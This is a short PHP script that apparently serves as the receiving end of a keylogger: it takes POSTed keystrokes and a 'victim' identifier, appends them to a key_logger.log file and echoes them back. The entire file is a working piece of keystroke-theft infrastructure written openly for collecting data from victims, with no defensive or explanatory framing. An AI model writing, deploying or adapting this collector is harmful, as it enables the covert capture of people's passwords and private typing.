<?php

    if(isset($_POST["logged_key"])){
        $key_logged = $_POST["logged_key"];
    }

    if(isset($_POST["victim"])){
        $victim = $_POST["victim"];
    }

    $result = '{"key_logged":" ' . $key_logged . '","victim":" ' . $victim . ' "}';

    $log_file = fopen("key_logger.log", "a")  or die("can't open file");;
    fwrite($log_file, $result."\n");
    fclose($log_file);

    echo $result;

?>